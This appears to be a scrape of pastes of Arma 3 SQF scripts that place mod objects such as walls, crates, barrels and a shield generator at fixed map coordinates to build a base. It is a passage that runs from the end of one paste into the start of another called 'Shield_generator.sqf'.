_object143 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object143 setPosASL [15020.8,20422.9,39.375];


_object144 = createVehicle [""OPTRE_RS_Warehouse"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object144 setVectorDirAndUp [[-0.35,-0.606218,0],[0,0,0.7]];
_object144 setPosASL [14973.3,20358.1,37.9917];


_object145 = createVehicle [""land_3as_cis_wall_inv_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object145 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object145 setPosASL [15012.5,20413.4,39.375];


_object146 = createVehicle [""land_3as_cis_ramp_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object146 setVectorDirAndUp [[-0.500001,-0.866025,0],[0,0,1]];
_object146 setPosASL [15028.9,20424,39.375];


_object147 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object147 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object147 setPosASL [15029.3,20432.4,39.375];


_object148 = createVehicle [""OPTRE_RS_RampsWarehouse_8x10m"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object148 setVectorDirAndUp [[-0.3,-0.519615,0],[0,0,0.6]];
_object148 setPosASL [14972.1,20359.2,37.8156];


_object149 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object149 setVectorDirAndUp [[0.500001,0.866025,0],[0,0,1]];
_object149 setPosASL [15013.6,20454.3,37.375];


_object150 = createVehicle [""land_3as_ExplodeBarrel_2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object150 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object150 setPosASL [14973.5,20353.8,38];


_object151 = createVehicle [""land_3as_ExplodeBarrel_2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object151 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object151 setPosASL [14975.9,20361.9,38];


_object152 = createVehicle [""land_3as_cis_wall_door_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object152 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object152 setPosASL [15000.8,20455.9,37.375];


_object153 = createVehicle [""land_3as_ExplodeBarrel_2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object153 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object153 setPosASL [14976.4,20361.4,38];


_object154 = createVehicle [""land_3as_ExplodeBarrel_2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object154 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object154 setPosASL [14975.8,20361.3,38];


_object155 = createVehicle [""land_3as_cis_wall_short_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object155 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object155 setPosASL [15004.8,20482.1,37.375];


_object156 = createVehicle [""land_3as_cis_wall_short_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object156 setVectorDirAndUp [[-0.866025,0.500001,0],[0,0,1]];
_object156 setPosASL [15005,20481.3,37.3415];


_object157 = createVehicle [""land_3as_cis_wall_tower_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object157 setVectorDirAndUp [[-0.965926,-0.258819,0],[0,0,1]];
_object157 setPosASL [15028.8,20482.9,37.375];


_object158 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object158 setVectorDirAndUp [[-0.866025,0.5,0],[0,0,1]];
_object158 setPosASL [15024.4,20467.6,37.375];


_object159 = createVehicle [""3as_small_crate_stack_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object159 setVectorDirAndUp [[0.258819,0.965926,0],[0,0,1]];
_object159 setPosASL [14988.6,20393.5,37.75];


_object160 = createVehicle [""3as_large_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object160 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object160 setPosASL [14984.6,20397.3,37.75];


_object161 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object161 setVectorDirAndUp [[-0.500001,-0.866025,0],[0,0,1]];
_object161 setPosASL [15009.4,20495.6,37.375];


_object162 = createVehicle [""land_3as_cis_wall_tower_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object162 setVectorDirAndUp [[0.258819,-0.965926,0],[0,0,1]];
_object162 setPosASL [15009.5,20494,37.375];


_object163 = createVehicle [""3as_Big_Box_3_Light_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object163 setVectorDirAndUp [[0.181173,-0.676148,0],[0,0,0.7]];
_object163 setPosASL [14998.9,20388.1,37.7606];


_object164 = createVehicle [""land_3as_cis_wall_bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object164 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object164 setPosASL [15020.3,20490.5,37.375];


_object165 = createVehicle [""3as_large_crate_stack_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object165 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object165 setPosASL [14997.8,20398.5,37.75];


_object166 = createVehicle [""Land_3as_ExplodeBarrel_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object166 setVectorDirAndUp [[0.5,-0.866025,0],[0,0,1]];
_object166 setPosASL [14986.6,20393.4,37.7691];


_object167 = createVehicle [""Land_3as_ExplodeBarrel_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object167 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object167 setPosASL [14994.6,20391,38.6702];


_object168 = createVehicle [""Land_3as_ExplodeBarrel_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object168 setVectorDirAndUp [[0.707107,-0.707107,0],[0,0,1]];
_object168 setPosASL [14986.9,20394.5,37.75];


_object169 = createVehicle [""Land_3as_ExplodeBarrel_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object169 setVectorDirAndUp [[-0.258819,-0.965926,0],[0,0,1]];
_object169 setPosASL [14988.1,20394.8,37.7691];


_object170 = createVehicle [""Land_3as_ExplodeBarrel_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object170 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object170 setPosASL [14994.2,20391.9,37.7691];


_object171 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object171 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object171 setPosASL [14994.9,20391.9,38.625];


_object172 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object172 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object172 setPosASL [14994.7,20391.1,37.7702];


_object173 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object173 setVectorDirAndUp [[0.707107,-0.707107,0],[0,0,1]];
_object173 setPosASL [14994.9,20392.4,37.75];


_object174 = createVehicle [""RD501_cis_mtt"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object174 setVectorDirAndUp [[-0.865582,0.500416,-0.0187735],[-0.0221482,-0.000803721,0.999754]];
_object174 setPosASL [14984.4,20377.3,36.6891];
[_object174, [], [], true] call BIS_fnc_initVehicle;

{_object174 removeMagazineTurret (_x select [0, 2])} forEach magazinesAllTurrets _object174;
{_object174 addMagazineTurret _x} forEach [[""3AS_40Rnd_MTT_HEAT"",[0],40],[""3AS_40Rnd_MTT_HEAT"",[0],40],[""3AS_40Rnd_MTT_HEAT"",[0],40],[""3AS_40Rnd_MTT_HEAT"",[1],40],[""3AS_40Rnd_MTT_HEAT"",[1],40],[""3AS_40Rnd_MTT_HEAT"",[1],40]];
_object175 = createVehicle [""OPTRE_RS_Warehouse"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object175 setVectorDirAndUp [[-0.35,-0.606218,0],[0,0,0.7]];
_object175 setPosASL [14994.9,20395.4,37.7691];


_object176 = createVehicle [""OPTRE_RS_RampsWarehouse_8x10m"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object176 setVectorDirAndUp [[-0.3,-0.519615,0],[0,0,0.6]];
_object176 setPosASL [14993.5,20396.1,37.6832];


_object177 = createVehicle [""land_3as_ExplodeBarrel_2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object177 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object177 setPosASL [14989.9,20394.4,37.75];


_object178 = createVehicle [""Land_3as_ExplodeBarrel_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object178 setVectorDirAndUp [[-1,1.19249e-008,0],[0,0,1]];
_object178 setPosASL [14995.5,20391.4,37.7691];


_object179 = createVehicle [""land_3as_cis_wall_Gate_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object179 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object179 setPosASL [14984.6,20428.9,39.375];


_object180 = createVehicle [""3as_Small_Box_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object180 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object180 setPosASL [14988.4,20404.1,37.7761];


_object181 = createVehicle [""3as_Small_Box_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object181 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object181 setPosASL [14989.4,20404.4,37.7708];


_object182 = createVehicle [""3as_Small_Box_5_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object182 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object182 setPosASL [14988.9,20404.3,38.75];


_object183 = createVehicle [""land_3as_ExplodeBarrel_2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object183 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object183 setPosASL [14989.9,20403.6,37.75];


_object184 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object184 setVectorDirAndUp [[0.866025,-0.500001,0],[0,0,1]];
_object184 setPosASL [14992.5,20466.6,37.375];


_object185 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object185 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object185 setPosASL [14998.6,20482.3,37.375];


_object186 = createVehicle [""land_3as_cis_ramp_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object186 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object186 setPosASL [14999.9,20473.6,37.375];


_object187 = createVehicle [""land_3as_cis_wall_bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object187 setVectorDirAndUp [[-0.866025,0.5,0],[0,0,1]];
_object187 setPosASL [15066.3,20331.9,40.625];


_object188 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object188 setVectorDirAndUp [[0.500001,0.866025,0],[0,0,1]];
_object188 setPosASL [15059.1,20321.9,40.5416];


_object189 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object189 setVectorDirAndUp [[-0.866025,0.500001,0],[0,0,1]];
_object189 setPosASL [15071.5,20343,40.6495];


_object190 = createVehicle [""land_3as_cis_wall_tower_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object190 setVectorDirAndUp [[-0.965926,-0.258819,0],[0,0,1]];
_object190 setPosASL [15070,20342.8,40.625];


_object191 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object191 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object191 setPosASL [15043.3,20328,40.6027];


_object192 = createVehicle [""land_3as_cis_wall_tower_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object192 setVectorDirAndUp [[-0.258819,0.965926,0],[0,0,1]];
_object192 setPosASL [15058.8,20323.5,40.5];


_object193 = createVehicle [""land_3as_cis_wall_short_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object193 setVectorDirAndUp [[-0.866025,0.500001,0],[0,0,1]];
_object193 setPosASL [15056,20349,40.5716];


_object194 = createVehicle [""land_3as_cis_wall_short_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object194 setVectorDirAndUp [[0.500001,0.866025,0],[0,0,1]];
_object194 setPosASL [15055.1,20348.8,40.6579];


_object195 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object195 setVectorDirAndUp [[-0.500001,-0.866025,0],[0,0,1]];
_object195 setPosASL [15042.1,20360.1,40.625];


_object196 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object196 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object196 setPosASL [15058.1,20353.8,40.6919];


_object197 = createVehicle [""land_3as_cis_wall_med_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object197 setVectorDirAndUp [[0.866025,-0.500001,0],[0,0,1]];
_object197 setPosASL [15033.6,20350.6,40.6306];


_object198 = createVehicle [""land_3as_cis_ramp_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object198 setVectorDirAndUp [[-0.866025,0.500001,0],[0,0,1]];
_object198 setPosASL [15047.4,20353.8,40.625];


_object199 = createVehicle [""3as_ModularPlatform_Straight_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object199 setVectorDirAndUp [[0.498981,0.866613,0],[0,0,1]];
_object199 setPosASL [15030.8,20352.5,40.25];


_object200 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object200 setVectorDirAndUp [[0.500001,0.866025,0],[0,0,1]];
_object200 setPosASL [15033.1,20390.3,39.375];


_object201 = createVehicle [""3as_Backless_Mortar_Pit_Trench"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object201 setVectorDirAndUp [[-0.260111,0.964278,-0.0501045],[-0.0146643,0.0479396,0.998743]];
_object201 setPosASL [15036.6,20374.4,37.613];


_object202 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object202 setVectorDirAndUp [[-0.866024,0.500002,0],[0,0,1]];
_object202 setPosASL [15050.5,20419.9,39.375];


_object203 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object203 setVectorDirAndUp [[-0.866025,0.5,0],[0,0,1]];
_object203 setPosASL [15043.9,20403.6,39.375];


_object204 = createVehicle [""land_3as_cis_wall_bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object204 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object204 setPosASL [15040.4,20427.1,39.375];


_object205 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object205 setVectorDirAndUp [[-0.866025,0.500001,0],[0,0,1]];
_object205 setPosASL [15030.5,20483.3,37.375];"
HqRMthZm,Shield_generator.sqf,milorules1012,SQF,Saturday 5th of April 2025 02:31:04 PM CDT,"_object0 = createVehicle [""babe_helper"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object0 setVectorDirAndUp [[0,1,0],[-0,-0,1]];
_object0 setPosASL [0,0,0.339777];


_object1 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object1 setVectorDirAndUp [[0.252773,-0.967526,0],[0,0,1]];
_object1 setPosASL [4791.45,8595.98,83.5817];


_object2 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object2 setVectorDirAndUp [[0.252773,-0.967526,0],[0,0,1]];
_object2 setPosASL [4797.49,8626.5,85.7393];


_object3 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object3 setVectorDirAndUp [[0.84218,0.539197,0],[0,0,1]];
_object3 setPosASL [4813.12,8575.06,83.1999];


_object4 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object4 setVectorDirAndUp [[6.65555e-009,-0.152261,0.98834],[-1,-4.37114e-008,1.91069e-015]];
_object4 setPosASL [4830.03,8584.9,134.783];


_object5 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object5 setVectorDirAndUp [[6.65555e-009,-0.152261,0.98834],[-1,-4.37114e-008,1.91069e-015]];
_object5 setPosASL [4828.64,8612.9,137.494];


_object6 = createVehicle [""land_3AS_fob_light_cis"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object6 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object6 setPosASL [4838.78,8629.88,80.4245];


_object7 = createVehicle [""Land_lsb_platform_50x50"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object7 setVectorDirAndUp [[0.965764,-0.259424,0],[0,0,1]];
_object7 setPosASL [4825.82,8614.93,79.3975];


_object8 = createVehicle [""3AS_CaveRock_4_Ice"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object8 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object8 setPosASL [4837.17,8613.88,115.631];


_object9 = createVehicle [""3AS_CaveRock_4_Ice"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object9 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object9 setPosASL [4837.55,8613.91,81.0732];


_object10 = createVehicle [""3AS_CaveRock_4_Ice"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object10 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object10 setPosASL [4837.65,8613.84,98.3193];


_object11 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object11 setVectorDirAndUp [[-0.152266,-0.988339,0],[0,0,1]];
_object11 setPosASL [4803.07,8654.65,84.5702];


_object12 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object12 setVectorDirAndUp [[6.65555e-009,-0.152261,0.98834],[-1,-4.37114e-008,1.91069e-015]];
_object12 setPosASL [4831.98,8641.93,135.535];


_object13 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object13 setVectorDirAndUp [[6.65555e-009,-0.152261,0.98834],[-1,-4.37114e-008,1.91069e-015]];
_object13 setPosASL [4830.59,8669.93,138.245];


_object14 = createVehicle [""Land_lsb_platform_50x50"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object14 setVectorDirAndUp [[0.965764,-0.259424,0],[0,0,1]];
_object14 setPosASL [4838.29,8661.25,79.3816];


_object15 = createVehicle [""land_3AS_ShieldGenerator"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object15 setVectorDirAndUp [[0.968641,-0.248466,0],[0,0,1]];
_object15 setPosASL [4838.26,8647.38,80.2476];


_object16 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object16 setVectorDirAndUp [[-0.152266,-0.988339,0],[0,0,1]];
_object16 setPosASL [4817.92,8681.69,86.7278];


_object17 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object17 setVectorDirAndUp [[0.955756,0.29416,0],[0,0,1]];
_object17 setPosASL [4811.86,8694.57,79.988];


_object18 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object18 setVectorDirAndUp [[0.84218,0.539197,0],[0,0,1]];
_object18 setPosASL [4844.02,8578.74,81.0423];


_object19 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object19 setVectorDirAndUp [[0.968211,0.250137,0],[0,0,1]];
_object19 setPosASL [4866.5,8572.41,82.2114];


_object20 = createVehicle [""land_3AS_cis_wall_Tower_v2_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object20 setVectorDirAndUp [[0.314684,0.949197,0],[0,0,1]];
_object20 setPosASL [4874.76,8594.77,80.1562];


_object21 = createVehicle [""3AS_CIS_Console_Prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object21 setVectorDirAndUp [[-0.247948,-0.968773,0],[0,0,1]];
_object21 setPosASL [4860.45,8628.23,80.3818];


_object22 = createVehicle [""OPTRE_Terrace_NM_Stairs1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object22 setVectorDirAndUp [[0.970232,-0.242178,0],[0,0,1]];
_object22 setPosASL [4855.49,8622.88,76.3816];


_object23 = createVehicle [""OPTRE_Terrace_NM_Stairs1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object23 setVectorDirAndUp [[0.970232,-0.242178,0],[0,0,1]];
_object23 setPosASL [4858.77,8635.84,76.3785];


_object24 = createVehicle [""OPTRE_Terrace_NM_Stairs1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object24 setVectorDirAndUp [[0.970232,-0.242178,0],[0,0,1]];
_object24 setPosASL [4852.26,8609.95,76.3815];


_object25 = createVehicle [""land_3AS_fob_light_cis"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object25 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object25 setPosASL [4845.94,8662.14,80.4085];


_object26 = createVehicle [""land_3AS_fob_light_cis"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object26 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object26 setPosASL [4843.02,8646.22,80.4085];


_object27 = createVehicle [""OPTRE_Terrace_NM_Stairs1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object27 setVectorDirAndUp [[0.970232,-0.242178,0],[0,0,1]];
_object27 setPosASL [4865.25,8661.72,76.3699];


_object28 = createVehicle [""OPTRE_Terrace_NM_Stairs1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object28 setVectorDirAndUp [[0.970232,-0.242178,0],[0,0,1]];
_object28 setPosASL [4868.49,8674.65,76.3611];


_object29 = createVehicle [""OPTRE_Terrace_NM_Stairs1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object29 setVectorDirAndUp [[0.970232,-0.242178,0],[0,0,1]];
_object29 setPosASL [4862.01,8648.77,76.3698];


_object30 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object30 setVectorDirAndUp [[0.760325,0.649543,0],[0,0,1]];
_object30 setPosASL [4870.43,8700.26,78.9995];


_object31 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object31 setVectorDirAndUp [[0.955756,0.29416,0],[0,0,1]];
_object31 setPosASL [4842.66,8693,77.8304];


_object32 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object32 setVectorDirAndUp [[0.955756,0.29416,0],[0,0,1]];
_object32 setPosASL [4867.94,8681.17,75.1514];


_object33 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object33 setVectorDirAndUp [[0.968211,0.250137,0],[0,0,1]];
_object33 setPosASL [4897.01,8566.29,80.0538];


_object34 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object34 setVectorDirAndUp [[0.0268901,0.149868,0.98834],[0.984282,-0.176605,2.106e-009]];
_object34 setPosASL [4880.62,8573.69,130.444];


_object35 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object35 setVectorDirAndUp [[-0.961042,-0.276401,0],[0,0,1]];
_object35 setPosASL [4909.49,8561.26,75.7938];


_object36 = createVehicle [""land_3AS_cis_wall_Long_v2_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object36 setVectorDirAndUp [[-0.951003,0.309183,0],[0,0,1]];
_object36 setPosASL [4882.19,8595.95,80.1939];


_object37 = createVehicle [""land_3AS_Imperial_Radar"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object37 setVectorDirAndUp [[-0.865404,-0.501075,0],[0,0,1]];
_object37 setPosASL [4899.56,8574.16,141.451];


_object38 = createVehicle [""land_3AS_cis_wall_Door_v2_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object38 setVectorDirAndUp [[-0.951003,0.309183,0],[0,0,1]];
_object38 setPosASL [4892.7,8618.5,78.5561];


_object39 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object39 setVectorDirAndUp [[0.0268901,0.149868,0.98834],[0.984282,-0.176605,2.106e-009]];
_object39 setPosASL [4884.2,8601.5,127.734];


_object40 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object40 setVectorDirAndUp [[0.0268901,0.149868,0.98834],[0.984282,-0.176605,2.106e-009]];
_object40 setPosASL [4892.61,8629.49,129.692];


_object41 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object41 setVectorDirAndUp [[0.0268901,0.149868,0.98834],[0.984282,-0.176605,2.106e-009]];
_object41 setPosASL [4896.19,8657.29,126.982];


_object42 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object42 setVectorDirAndUp [[0.955756,0.29416,0],[0,0,1]];
_object42 setPosASL [4890.28,8669.66,72.9427];


_object43 = createVehicle [""land_3AS_cis_wall_Long_v2_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object43 setVectorDirAndUp [[-0.951003,0.309183,0],[0,0,1]];
_object43 setPosASL [4897.46,8641.51,76.6916];


_object44 = createVehicle [""land_3AS_cis_wall_Tower_v2_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object44 setVectorDirAndUp [[-0.33357,-0.942725,0],[0,0,1]];
_object44 setPosASL [4892.13,8647.52,76.7312];


_object45 = createVehicle [""Land_SharpRock_spike"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object45 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object45 setPosASL [4898.23,8692.97,74.9189];


_object46 = createVehicle [""3AS_Rock_13_Ice"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object46 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object46 setPosASL [4909.19,8686.1,75.0008];


_object47 = createVehicle [""land_3AS_Bunker_Metal_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object47 setVectorDirAndUp [[-0.566873,0.823805,0],[0,0,1]];
_object47 setPosASL [4951.97,8394.94,141.84];


_object48 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object48 setVectorDirAndUp [[-0.823805,-0.566873,0],[0,0,1]];
_object48 setPosASL [4949.99,8386.64,141.84];


_object49 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object49 setVectorDirAndUp [[-0.566873,0.823805,0],[0,0,1]];
_object49 setPosASL [4943.56,8395.99,141.84];


_object50 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object50 setVectorDirAndUp [[0.566873,-0.823805,0],[0,0,1]];
_object50 setPosASL [4952.96,8388.7,141.84];


_object51 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object51 setVectorDirAndUp [[0.823802,0.566877,0],[0,0,1]];
_object51 setPosASL [4946.53,8398.05,141.84];


_object52 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object52 setVectorDirAndUp [[-0.961042,-0.276401,0],[0,0,1]];
_object52 setPosASL [4940.15,8555.97,77.9513];


_object53 = createVehicle [""3as_FlatShield_50x50E"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object53 setVectorDirAndUp [[0.127522,0.991803,0.00799293],[0.0346632,-0.0125104,0.999321]];
_object53 setPosASL [4951.79,8559.79,77.023];


_object54 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object54 setVectorDirAndUp [[6.65555e-009,-0.152261,0.98834],[-1,-4.37114e-008,1.91069e-015]];
_object54 setPosASL [4935.46,8568.27,118.934];


_object55 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object55 setVectorDirAndUp [[0.00178122,0.152251,0.98834],[0.999932,-0.0116985,1.39503e-010]];
_object55 setPosASL [4934.07,8596.27,121.644];


_object56 = createVehicle [""land_3AS_fob_light_cis"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object56 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object56 setPosASL [4943.73,8570.21,77.0696];


_object57 = createVehicle [""land_3AS_cis_wall_Gate_v2_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object57 setVectorDirAndUp [[-0.991928,0.1268,0],[0,0,1]];
_object57 setPosASL [4956.36,8597.99,74.8716];


